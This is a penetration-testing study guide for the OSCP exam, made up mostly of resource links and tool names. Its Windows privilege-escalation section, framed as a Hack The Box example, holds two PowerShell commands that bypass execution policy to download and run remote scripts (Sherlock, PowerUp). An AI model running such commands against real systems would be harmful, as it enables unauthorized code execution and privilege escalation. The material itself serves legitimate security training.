# OSCP-Prepration
---------------------------
PWK Syllabus
https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf

### OSCP like VulnHub Game 
https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms.html


### Linux and Bash

1. Linux Journey - https://linuxjourney.com/
2. Bash for Beginners  - http://www.tldp.org/LDP/Bash-Beginners-Guide/html/
3. Explainshell - http://www.explainshell.com/

### Basic tools
	
1. Netcat: Most important tool in the entire course. Understand what it does, what options you have, difference between a reverse shell and a bind shell. Experiment a lot with it.
2. Ncat: Netcat’s mature brother, supports SSL. Part of Nmap.
3. Wireshark: Network analysis tool, play with it while browsing the internet, connecting to FTP, read/write PCAP files.
4. TCPdump: Not all machines have that cute GUI, you could be stuck with a terminal.

### Passive Recon

1. Google dorks
2. Whois
3. Netcraft
4. Recon-ng

### Active Recon

### Buffer Overflow
https://github.com/fkclai/bufferoverflow

### Using public exploits

### File Transfer

### Windows Privilege Escalation

- Information Generating
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

- Window Privilege Escalation via Automated Script
https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/

- Windows Exploit-Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
e.g. HTB Json
```
./windows-exploit-suggester.py --database 2019-11-06-mssb.xlsx --systeminfo json-systeminfo.txt 
```

- Missing software patches - Sherlock
https://github.com/rasta-mouse/Sherlock
e.g. HTB Json
```
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.18:8888/Sherlock.ps1'); Find-AllVulns -Command 'start powershell.exe'" 
```

- PowerSploit
https://github.com/PowerShellMafia/PowerSploit

```
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.18:8888/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks -Command 'start powershell.exe'" 
```
- Other Tools 
https://www.secureauth.com/labs/open-source-tools/impacket

### Linux Privilege Escalation
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### Client Side Attacks
https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/

### Web Application Attacks
1. OWASP top10 2017
https://www.owasp.org/index.php/Top_10-2017_Top_10

2. Training
https://www.hacksplaining.com/

### Password Attacks
1. Hydra
2. JTR
3. Medusa

### Port redirection/tunneling
https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/

### Metasploit Framework
https://www.offensive-security.com/metasploit-unleashed/

### Antivirus Bypassing
